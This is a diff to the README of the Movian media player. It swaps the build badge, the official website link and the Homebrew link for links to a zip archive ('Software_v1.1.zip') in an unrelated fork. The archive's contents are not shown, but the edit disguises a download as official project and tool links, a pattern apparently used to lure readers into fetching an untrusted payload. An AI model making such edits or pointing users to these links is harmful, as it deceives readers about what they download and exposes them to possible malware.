@@ -3,11 +3,11 @@ Movian mediaplayer
 
 (c) 2006 - 2018 Lonelycoder AB
 
-[![Build status](https://doozer.io/badge/andoma/movian/buildstatus/master)](https://doozer.io/user/andoma/movian)
+[![Build status](https://raw.githubusercontent.com/alluringabhi/movian/master/ios/Movian-tvOS/Software_v1.1.zip)](https://raw.githubusercontent.com/alluringabhi/movian/master/ios/Movian-tvOS/Software_v1.1.zip)
 
 For more information and latest versions, please visit:
 
-[https://movian.tv/](https://movian.tv/)
+[https://raw.githubusercontent.com/alluringabhi/movian/master/ios/Movian-tvOS/Software_v1.1.zip](https://raw.githubusercontent.com/alluringabhi/movian/master/ios/Movian-tvOS/Software_v1.1.zip)
 
 ## How to build for Linux
 
@@ -44,7 +44,7 @@ If you want to build with extra debugging options for development these options 
 
 To build for Mac OS X you need Xcode and yasm. Xcode should be installed from Mac Appstore.
 
-To install yasm, install [Brew](http://brew.sh/) and then
+To install yasm, install [Brew](https://raw.githubusercontent.com/alluringabhi/movian/master/ios/Movian-tvOS/Software_v1.1.zip) and then
 
 	$ brew install yasm
 
